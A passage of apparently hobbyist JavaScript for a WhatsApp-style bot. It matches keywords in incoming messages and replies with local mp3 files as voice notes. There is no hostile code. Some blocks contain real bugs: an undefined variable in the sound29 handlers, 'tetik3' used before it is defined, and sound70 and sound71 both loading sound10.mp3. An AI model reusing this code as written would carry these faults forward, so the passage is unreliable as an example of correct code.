if (budy.includes('sound23')) {
duatiga = fs.readFileSync('assets/sound23.mp3');
dimas.sendMessage(from, duatiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound24')) {
duaempat = fs.readFileSync('assets/sound24.mp3');
dimas.sendMessage(from, duaempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound25')) {
dualima = fs.readFileSync('assets/sound25.mp3');
dimas.sendMessage(from, dualima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound26')) {
duaenam = fs.readFileSync('assets/sound26.mp3');
dimas.sendMessage(from, duaenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound27')) {
duatujuh = fs.readFileSync('assets/sound27.mp3');
dimas.sendMessage(from, duatujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound28')) {
duadelapan = fs.readFileSync('assets/sound28.mp3');
dimas.sendMessage(from, duadelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound29')) {
duasembilan = fs.readFileSync('assets/sound29.mp3');
dimas.sendMessage(from, duasembilansembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound30')) {
tigapuluh = fs.readFileSync('assets/sound30.mp3');
dimas.sendMessage(from, tigapuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound31')) {
tigasatu = fs.readFileSync('assets/sound31.mp3');
dimas.sendMessage(from, tigasatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound32')) {
tigadua = fs.readFileSync('assets/sound32.mp3');
dimas.sendMessage(from, tigadua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound33')) {
tigatiga = fs.readFileSync('assets/sound33.mp3');
dimas.sendMessage(from, tigatiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound34')) {
tigaempat = fs.readFileSync('assets/sound34.mp3');
dimas.sendMessage(from, tigaempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound35')) {
tigalima = fs.readFileSync('assets/sound35.mp3');
dimas.sendMessage(from, tigalima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound36')) {
tigaenam = fs.readFileSync('assets/sound36.mp3');
dimas.sendMessage(from, tigaenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound37')) {
tigatujuh = fs.readFileSync('assets/sound37.mp3');
dimas.sendMessage(from, tigatujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound38')) {
tigadelapan = fs.readFileSync('assets/sound38.mp3');
dimas.sendMessage(from, tigadelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound39')) {
tigasembilan = fs.readFileSync('assets/sound39.mp3');
dimas.sendMessage(from, tigasembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound40')) {
empatpuluh = fs.readFileSync('assets/sound40.mp3');
dimas.sendMessage(from, empatpuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound41')) {
empatsatu = fs.readFileSync('assets/sound41.mp3');
dimas.sendMessage(from, empatsatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound42')) {
empatdua = fs.readFileSync('assets/sound42.mp3');
dimas.sendMessage(from, empatdua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound43')) {
empattiga = fs.readFileSync('assets/sound43.mp3');
dimas.sendMessage(from, empattiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound44')) {
empatempat = fs.readFileSync('assets/sound44.mp3');
dimas.sendMessage(from, empatempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound45')) {
empatlima = fs.readFileSync('assets/sound45.mp3');
dimas.sendMessage(from, empatlima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound46')) {
empatenam = fs.readFileSync('assets/sound46.mp3');
dimas.sendMessage(from, empatenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound47')) {
empattujuh = fs.readFileSync('assets/sound47.mp3');
dimas.sendMessage(from, empattujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound48')) {
empatdelapan = fs.readFileSync('assets/sound48.mp3');
dimas.sendMessage(from, empatdelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound49')) {
empatsembilan = fs.readFileSync('assets/sound49.mp3');
dimas.sendMessage(from, empatsembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound50')) {
limapuluh = fs.readFileSync('assets/sound50.mp3');
dimas.sendMessage(from, limapuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound51')) {
limasatu = fs.readFileSync('assets/sound51.mp3');
dimas.sendMessage(from, limasatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound52')) {
limadua = fs.readFileSync('assets/sound52.mp3');
dimas.sendMessage(from, limadua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound53')) {
limatiga = fs.readFileSync('assets/sound53.mp3');
dimas.sendMessage(from, limatiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound54')) {
limaempat = fs.readFileSync('assets/sound54.mp3');
dimas.sendMessage(from, limaempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound55')) {
limalima = fs.readFileSync('assets/sound55.mp3');
dimas.sendMessage(from, limalima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound56')) {
limaenam = fs.readFileSync('assets/sound56.mp3');
dimas.sendMessage(from, limaenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound57')) {
limatujuh = fs.readFileSync('assets/sound57.mp3');
dimas.sendMessage(from, limatujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound58')) {
limadelapan = fs.readFileSync('assets/sound58.mp3');
dimas.sendMessage(from, limadelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound59')) {
limasembilan = fs.readFileSync('assets/sound59.mp3');
dimas.sendMessage(from, limasembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound60')) {
enampuluh = fs.readFileSync('assets/sound60.mp3');
dimas.sendMessage(from, enampuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound61')) {
enamsatu = fs.readFileSync('assets/sound61.mp3');
dimas.sendMessage(from, enamsatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound62')) {
enamdua = fs.readFileSync('assets/sound62.mp3');
dimas.sendMessage(from, enamdua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound63')) {
enamtiga = fs.readFileSync('assets/sound63.mp3');
dimas.sendMessage(from, enamtiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound64')) {
enamempat = fs.readFileSync('assets/sound64.mp3');
dimas.sendMessage(from, enamempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound65')) {
enamlima = fs.readFileSync('assets/sound65.mp3');
dimas.sendMessage(from, enamlima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound66')) {
enamenam = fs.readFileSync('assets/sound66.mp3');
dimas.sendMessage(from, enamenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound67')) {
enamtujuh = fs.readFileSync('assets/sound67.mp3');
dimas.sendMessage(from, enamtujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound68')) {
enamdelapan = fs.readFileSync('assets/sound68.mp3');
dimas.sendMessage(from, enamdelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound69')) {
enamsembilan = fs.readFileSync('assets/sound69.mp3');
dimas.sendMessage(from, enamsembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound70')) {
tujuhpuluh = fs.readFileSync('assets/sound10.mp3');
dimas.sendMessage(from, tujuhpuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound71')) {
tujuhsatu = fs.readFileSync('assets/sound10.mp3');
dimas.sendMessage(from, tujuhsatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
//////////////////////////////clone///////////////////////////////






if (budy.includes('Home')) {
const home = fs.readFileSync('assets/home.mp3')
dimas.sendMessage(from, home, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Gettingold')) {
const getting = fs.readFileSync('assets/gettingold.mp3')
dimas.sendMessage(from, getting, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Tapi')) {
const tapi = fs.readFileSync('assets/tapi.mp3')
dimas.sendMessage(from, tapi, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Iri')) {
const iri = fs.readFileSync('assets/iri.mp3')
dimas.sendMessage(from, iri, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Magic')) {
const magic = fs.readFileSync('assets/magic.mp3')
dimas.sendMessage(from, magic, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Menyukaiku')) {
const menyukaiku = fs.readFileSync('assets/menyukaiku.mp3')
dimas.sendMessage(from, menyukaiku, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sad')) {
const sad1 = fs.readFileSync('assets/sad.mp3')
dimas.sendMessage(from, sad1, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Sad2')) {
const sad2 = fs.readFileSync('assets/sad2.mp3')
dimas.sendMessage(from, sad2, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Sad3')) {
const sad3 = fs.readFileSync('assets/sad3.mp3')
dimas.sendMessage(from, sad3, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Sad4')) {
const sad4 = fs.readFileSync('assets/sad4.mp3')
dimas.sendMessage(from, sad4, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Aeshtetic')) {
const tetik = fs.readFileSync('assets/aeshtetic.mp3')
dimas.sendMessage(from, tetik, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Aeshtetic2')) {
const tetik2 = fs.readFileSync('assets/aeshtetic2.mp3')
dimas.sendMessage(from, tetik3, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('aeshtetic3')) {
const tetik3 = fs.readFileSync('assets/aeshtetic3.mp3')
dimas.sendMessage(from, tetik3, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Aeshtetic4')) {
const tetik4 = fs.readFileSync('assets/aeshtetic4.mp3')
dimas.sendMessage(from, tetik4, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Allnight')) {
const allnight = fs.readFileSync('assets/allnight.mp3')
dimas.sendMessage(from, allnight, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Aucas')) {
const lucas = fs.readFileSync('assets/lucas.mp3')
dimas.sendMessage(from, lucas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Sowell')) {
const well = fs.readFileSync('assets/sowell.mp3')
dimas.sendMessage(from, well, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Wanna')) {
const wanna = fs.readFileSync('assets/wanna.mp3')
dimas.sendMessage(from, wanna, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Up')) {
const ups = fs.readFileSync('assets/up.mp3')
dimas.sendMessage(from, ups, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Yourskin')) {
const skin = fs.readFileSync('assets/yourskin.mp3')
dimas.sendMessage(from, skin, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Cutmeoff')) {
const moff = fs.readFileSync('assets/cutmeoff.mp3')
dimas.sendMessage(from, moff, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Beautiful')) {
const ful = fs.readFileSync('assets/beautiful.mp3')
dimas.sendMessage(from, ful, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Ioosinggame')) {
const gam = fs.readFileSync('assets/loosinggame.mp3')
dimas.sendMessage(from, gam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Ioosinginterest')) {
const rest = fs.readFileSync('assets/loosinginterest.mp3')
dimas.sendMessage(from, rest, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Playdate')) {
const date = fs.readFileSync('assets/playdate.mp3')
dimas.sendMessage(from, date, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Ayatkursi2')) {
const kursi = fs.readFileSync('assets/ayatkursi2.mp3')
dimas.sendMessage(from, kursi, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 

if (budy.includes('Yasin')) {
yasin = fs.readFileSync('assets/yasin.mp3')
dimas.sendMessage(from, yasin, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Arrahman')) {
arrahman = fs.readFileSync('assets/arrahman.mp3')
dimas.sendMessage(from, arrahman, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Tilawah')) {
const tilawah = fs.readFileSync('assets/tilawah.mp3')
dimas.sendMessage(from, tilawah, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Sholawatnabi')) {
const nabi = fs.readFileSync('assets/sholawatnabi.mp3')
dimas.sendMessage(from, nabi, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Ngaji')) {
const ngaji1 = fs.readFileSync('assets/ngaji.mp3')
dimas.sendMessage(from, ngaji1, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Ngaji2')) {
const ngaji2 = fs.readFileSync('assets/ngaji2.mp3')
dimas.sendMessage(from, ngaji2, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Iriii')) {
const irimp3 = fs.readFileSync('./assets/iri.mp3');
dimas.sendMessage(from, irimp3, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Pale')) {
const pale = fs.readFileSync('assets/pale.mp3')
dimas.sendMessage(from, pale, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Ceksound')) {
const soun = fs.readFileSync('assets/sound.mp3')
dimas.sendMessage(from, soun, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Allo')) {
const hallo = fs.readFileSync('./assets/hallo.mp3')
dimas.sendMessage(from, hallo, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('Sound1')) {
satu = fs.readFileSync('./assets/sound1.mp3');
dimas.sendMessage(from, satu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound2')) {
dua = fs.readFileSync('./assets/sound2.mp3');
dimas.sendMessage(from, dua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound3')) {
tiga = fs.readFileSync('./assets/sound3.mp3');
dimas.sendMessage(from, tiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound4')) {
empat = fs.readFileSync('./assets/sound4.mp3');
dimas.sendMessage(from, empat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound5')) {
lima = fs.readFileSync('./assets/sound5.mp3');
dimas.sendMessage(from, lima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound6')) {
enam = fs.readFileSync('./assets/sound6.mp3');
dimas.sendMessage(from, enam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound7')) {
tujuh = fs.readFileSync('./assets/sound7.mp3');
dimas.sendMessage(from, tujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound8')) {
delapan = fs.readFileSync('assets/sound8.mp3');
dimas.sendMessage(from, delapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound9')) {
sembilan = fs.readFileSync('assets/sound9.mp3');
dimas.sendMessage(from, sembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound10')) {
sepuluh = fs.readFileSync('assets/sound10.mp3');
dimas.sendMessage(from, sepuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound11')) {
sebelas = fs.readFileSync('assets/sound11.mp3');
dimas.sendMessage(from, sebelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound12')) {
duabelas = fs.readFileSync('assets/sound12.mp3');
dimas.sendMessage(from, duabelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound13')) {
tigabelas = fs.readFileSync('assets/sound13.mp3');
dimas.sendMessage(from, tigabelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound14')) {
empatbelas = fs.readFileSync('assets/sound14.mp3');
dimas.sendMessage(from, empatbelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound15')) {
limabelas = fs.readFileSync('assets/sound15.mp3');
dimas.sendMessage(from, limabelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound16')) {
enambelas = fs.readFileSync('assets/sound16.mp3');
dimas.sendMessage(from, enambelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound17')) {
tujuhbelas = fs.readFileSync('assets/sound17.mp3');
dimas.sendMessage(from, tujuhbelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound18')) {
delapanbelas = fs.readFileSync('assets/sound18.mp3');
dimas.sendMessage(from, delapanbelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound19')) {
sembilanbelas = fs.readFileSync('assets/sound19.mp3');
dimas.sendMessage(from, sembilanbelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound20')) {
duapuluh = fs.readFileSync('assets/sound20.mp3');
dimas.sendMessage(from, duapuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound21')) {
duasatu = fs.readFileSync('assets/sound21.mp3');
dimas.sendMessage(from, duasatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound22')) {
duadua = fs.readFileSync('assets/sound22.mp3');
dimas.sendMessage(from, duadua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound23')) {
duatiga = fs.readFileSync('assets/sound23.mp3');
dimas.sendMessage(from, duatiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound24')) {
duaempat = fs.readFileSync('assets/sound24.mp3');
dimas.sendMessage(from, duaempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound25')) {
dualima = fs.readFileSync('assets/sound25.mp3');
dimas.sendMessage(from, dualima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound26')) {
duaenam = fs.readFileSync('assets/sound26.mp3');
dimas.sendMessage(from, duaenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound27')) {
duatujuh = fs.readFileSync('assets/sound27.mp3');
dimas.sendMessage(from, duatujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound28')) {
duadelapan = fs.readFileSync('assets/sound28.mp3');
dimas.sendMessage(from, duadelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound29')) {
duasembilan = fs.readFileSync('assets/sound29.mp3');
dimas.sendMessage(from, duasembilansembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound30')) {
tigapuluh = fs.readFileSync('assets/sound30.mp3');
dimas.sendMessage(from, tigapuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound31')) {
tigasatu = fs.readFileSync('assets/sound31.mp3');
dimas.sendMessage(from, tigasatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound32')) {
tigadua = fs.readFileSync('assets/sound32.mp3');
dimas.sendMessage(from, tigadua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound33')) {
tigatiga = fs.readFileSync('assets/sound33.mp3');
dimas.sendMessage(from, tigatiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound34')) {
tigaempat = fs.readFileSync('assets/sound34.mp3');
dimas.sendMessage(from, tigaempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound35')) {
tigalima = fs.readFileSync('assets/sound35.mp3');
dimas.sendMessage(from, tigalima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound36')) {
tigaenam = fs.readFileSync('assets/sound36.mp3');
dimas.sendMessage(from, tigaenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound37')) {
tigatujuh = fs.readFileSync('assets/sound37.mp3');
dimas.sendMessage(from, tigatujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound38')) {
tigadelapan = fs.readFileSync('assets/sound38.mp3');
dimas.sendMessage(from, tigadelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound39')) {
tigasembilan = fs.readFileSync('assets/sound39.mp3');
dimas.sendMessage(from, tigasembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound40')) {
empatpuluh = fs.readFileSync('assets/sound40.mp3');
dimas.sendMessage(from, empatpuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound41')) {
empatsatu = fs.readFileSync('assets/sound41.mp3');
dimas.sendMessage(from, empatsatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound42')) {
empatdua = fs.readFileSync('assets/sound42.mp3');
dimas.sendMessage(from, empatdua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound43')) {
empattiga = fs.readFileSync('assets/sound43.mp3');
dimas.sendMessage(from, empattiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound44')) {
empatempat = fs.readFileSync('assets/sound44.mp3');
dimas.sendMessage(from, empatempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound45')) {
empatlima = fs.readFileSync('assets/sound45.mp3');
dimas.sendMessage(from, empatlima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound46')) {
empatenam = fs.readFileSync('assets/sound46.mp3');
dimas.sendMessage(from, empatenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound47')) {
empattujuh = fs.readFileSync('assets/sound47.mp3');
dimas.sendMessage(from, empattujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound48')) {
empatdelapan = fs.readFileSync('assets/sound48.mp3');
dimas.sendMessage(from, empatdelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound49')) {
empatsembilan = fs.readFileSync('assets/sound49.mp3');
dimas.sendMessage(from, empatsembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound50')) {
limapuluh = fs.readFileSync('assets/sound50.mp3');
dimas.sendMessage(from, limapuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound51')) {
limasatu = fs.readFileSync('assets/sound51.mp3');
dimas.sendMessage(from, limasatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound52')) {
limadua = fs.readFileSync('assets/sound52.mp3');
dimas.sendMessage(from, limadua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound53')) {
limatiga = fs.readFileSync('assets/sound53.mp3');
dimas.sendMessage(from, limatiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound54')) {
limaempat = fs.readFileSync('assets/sound54.mp3');
dimas.sendMessage(from, limaempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound55')) {
limalima = fs.readFileSync('assets/sound55.mp3');
dimas.sendMessage(from, limalima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound56')) {
limaenam = fs.readFileSync('assets/sound56.mp3');
dimas.sendMessage(from, limaenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound57')) {
limatujuh = fs.readFileSync('assets/sound57.mp3');
dimas.sendMessage(from, limatujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound58')) {
limadelapan = fs.readFileSync('assets/sound58.mp3');
dimas.sendMessage(from, limadelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound59')) {
limasembilan = fs.readFileSync('assets/sound59.mp3');
dimas.sendMessage(from, limasembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound60')) {
enampuluh = fs.readFileSync('assets/sound60.mp3');
dimas.sendMessage(from, enampuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound61')) {
enamsatu = fs.readFileSync('assets/sound61.mp3');
dimas.sendMessage(from, enamsatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound62')) {
enamdua = fs.readFileSync('assets/sound62.mp3');
dimas.sendMessage(from, enamdua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound63')) {
enamtiga = fs.readFileSync('assets/sound63.mp3');
dimas.sendMessage(from, enamtiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound64')) {
enamempat = fs.readFileSync('assets/sound64.mp3');
dimas.sendMessage(from, enamempat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound65')) {
enamlima = fs.readFileSync('assets/sound65.mp3');
dimas.sendMessage(from, enamlima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound66')) {
enamenam = fs.readFileSync('assets/sound66.mp3');
dimas.sendMessage(from, enamenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound67')) {
